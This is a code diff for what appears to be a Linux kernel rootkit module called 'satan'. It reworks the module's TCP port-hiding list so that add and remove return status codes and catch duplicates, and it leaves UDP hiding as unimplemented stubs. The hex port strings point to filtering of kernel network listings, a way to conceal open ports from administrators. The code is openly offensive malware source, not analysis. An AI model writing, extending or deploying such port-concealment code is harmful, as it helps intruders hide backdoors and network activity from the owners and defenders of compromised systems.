@@ -24,8 +24,8 @@ struct hidden_port {
 static LIST_HEAD(hidden_ports_list);  // list of hidden ports.
 
 static struct hidden_port *hidden_ports_list_get(unsigned int port_num);
-static void hidden_ports_list_add(unsigned int port_num);
-static void hidden_ports_list_del(unsigned int port_num);
+static int hidden_ports_list_add(unsigned int port_num);
+static int hidden_ports_list_del(unsigned int port_num);
 static void hidden_ports_list_clear(void);
 
 
@@ -63,23 +63,23 @@ int satan_port_unhide(unsigned int port_num)
 
 int satan_port_tcp_hide(unsigned int port_num)
 {
-        hidden_ports_list_add(port_num);
-        return 0;
+        return hidden_ports_list_add(port_num);
 }
 
 int satan_port_tcp_unhide(unsigned int port_num)
 {
-        hidden_ports_list_del(port_num);
-        return 0;
+        return hidden_ports_list_del(port_num);
 }
 
 int satan_port_udp_hide(unsigned int port_num)
 {
+        // Not implemented yet.
         return 0;
 }
 
 int satan_port_udp_unhide(unsigned int port_num)
 {
+        // Not implemented yet.
         return 0;
 }
 
@@ -102,25 +102,39 @@ static struct hidden_port *hidden_ports_list_get(unsigned int port_num)
         return NULL;
 }
 
-static void hidden_ports_list_add(unsigned int port_num)
+static int hidden_ports_list_add(unsigned int port_num)
 {
-        struct hidden_port *p = (struct hidden_port *) kmalloc(sizeof(struct hidden_port), GFP_KERNEL);
+        struct hidden_port *p = hidden_ports_list_get(port_num);
+
+        if (p) {
+                pr_alert("satan: port: %d is already hidden.\n", port_num);
+                return 1;
+        }
+
+
+        p = (struct hidden_port *) kmalloc(sizeof(struct hidden_port), GFP_KERNEL);
         p->port_num = port_num;
         snprintf(p->port_num_hex_str, PORT_NUM_HEX_STR_LEN, ":%04X", port_num);
 
         pr_info("satan: port: adding %d to list of hidden ports\n", port_num);
         list_add_tail(&(p->list), &hidden_ports_list);
+        return 0;
 }
 
-static void hidden_ports_list_del(unsigned int port_num)
+static int hidden_ports_list_del(unsigned int port_num)
 {
         struct hidden_port *p = hidden_ports_list_get(port_num);
 
-        if (p) {
-                pr_info("satan: port: removing %d from list of hidden ports.\n", port_num);
-                list_del(&(p->list));
-                kfree(p);
+        if (!p) {
+                pr_info("satan: port: %d has not been hidden.\n", port_num);
+                return 1;
         }
+
+
+        pr_info("satan: port: removing %d from list of hidden ports.\n", port_num);
+        list_del(&(p->list));
+        kfree(p);
+        return 0;
 }
 
 static void hidden_ports_list_clear(void)
